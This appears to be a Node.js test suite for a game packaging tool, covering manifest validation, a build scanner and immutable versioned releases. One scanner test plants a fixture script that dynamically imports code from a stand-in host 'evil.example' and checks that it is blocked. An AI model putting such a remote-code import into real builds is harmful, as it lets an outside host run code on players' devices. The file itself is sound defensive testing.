import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,mkdir,readFile,writeFile} from 'node:fs/promises';
import {join} from 'node:path';
import {tmpdir} from 'node:os';
import {validateManifest} from '../src/manifest.mjs';
import {scanBuild} from '../src/scanner.mjs';
import {packageBuild} from '../src/package-build.mjs';

const manifest={schemaVersion:1,slug:'sample-game',title:'Sample Game',version:'1.0.0',genres:['Arcade'],orientation:'any',tier:'free',inputModes:['touch'],entryFile:'index.html',bridgeVersion:'1.0',permissions:{fullscreen:false}};
async function fixture(){const root=await mkdtemp(join(tmpdir(),'ga-game-'));const source=join(root,'source');const output=join(root,'output');await mkdir(source);await writeFile(join(source,'index.html'),'<!doctype html><html><script src="game.js"></script></html>');await writeFile(join(source,'game.js'),'console.log("ok")');return{root,source,output};}

test('manifest validation requires complete release metadata',()=>{assert.equal(validateManifest(manifest).ok,true);assert.equal(validateManifest({...manifest,entryFile:'../index.html'}).ok,false);});
test('scanner blocks server files and remote executable scripts',async()=>{const f=await fixture();await writeFile(join(f.source,'bad.php'),'x');await writeFile(join(f.source,'game.js'),'import("https://evil.example/x.js")');const result=await scanBuild(f.source);assert.equal(result.ok,false);assert.ok(result.errors.some(item=>item.code==='server_or_executable_file'));assert.ok(result.errors.some(item=>item.code==='remote_script'));});
test('packager creates immutable versioned release',async()=>{const f=await fixture();const release=await packageBuild({manifest,sourceDir:f.source,outputRoot:f.output,auditActor:'test'});assert.equal(release.entrypoint,'/games/sample-game/1.0.0/index.html');assert.equal(release.files.length,2);const stored=JSON.parse(await readFile(join(f.output,'games/sample-game/1.0.0/game-manifest.json'),'utf8'));assert.equal(stored.buildSha256,release.buildSha256);const again=await packageBuild({manifest,sourceDir:f.source,outputRoot:f.output,auditActor:'test'});assert.equal(again.buildSha256,release.buildSha256);await writeFile(join(f.source,'game.js'),'console.log("changed")');await assert.rejects(()=>packageBuild({manifest,sourceDir:f.source,outputRoot:f.output,auditActor:'test'}),/Immutable version/);});
